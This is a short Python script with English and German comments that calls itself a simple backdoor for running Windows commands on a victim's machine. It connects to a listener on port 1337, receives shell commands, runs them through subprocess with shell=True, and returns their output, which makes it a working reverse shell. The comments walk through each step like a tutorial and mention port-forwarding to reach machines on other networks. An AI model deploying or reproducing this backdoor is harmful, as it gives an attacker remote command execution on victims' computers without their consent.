# This is a simple Backdoor to execute Windows commands on the targets machine
# Dieses Programm ist eine simple Backdoor, um Windows Befehle auf dem Computer des Opfers auszuführen

# NOTE: This only works in the local network. To use it over different networks you will have to do Port-forwarding, which i won't explain here. Port-forwarding also dosen't work for everyone
# NOTE: Diese Backdoor funktioniert nur im lokalen Netzwerk. Um sie über verschiedene Netzwerke zu benutzen, muss man Port-forwarding betreiben, welches ich hier nicht erklären werde. Port-forwarding funktioniert auch nicht bei jedem

# # # # # # #
#  imports  #
# # # # # # #
from socket import *
import socket
import subprocess
import os
# no installation needed

# At first we'll define two variables, which will be the server and the port we are connecting to. 127.0.0.1 is the localHost, so the local Computer. You can use a custom port, but make sure that the sender has the same
# Als erstest  definieren wir zwei Variablen, welche der Server und der Port sind, mit dem wir uns verbinden. 127.0.0.1 ist der localHost, also der lokale Computer. Als Port kannst du einen benutzerdefinierten Port benutzen,
# beachte jedoch, dass der sender auf dem gleichen Port ist

client = "127.0.0.1"
port = 1337


# Here we are setting up the connection, to connect the target to us
# Hier bauen wir die Verbindung auf, um das Ziel mit uns zu verbinden
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((client, port))
s.send(str.encode("Backdoor running"))

# Here we are using a while loop, to keep the data sending and recieving alive
# Hier benutzen wir eine While Schleife, um die Datenübertragung am Leben zu halten
while True:
    # data is the byte size, which can be recieved
    # data ist die Byte Größe, die empfangen werden kann
    data = s.recv(2024)
    proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

    # The subprocess makes us able to use the command line
    # Der subprocess macht es uns möglich, die Command Line zu benutzen

    stdout = proc.stdout.read()
    stderr = proc.stderr.read()
    s.send(stdout)
    s.send(stderr)
    print(stdout)
    print(stderr)
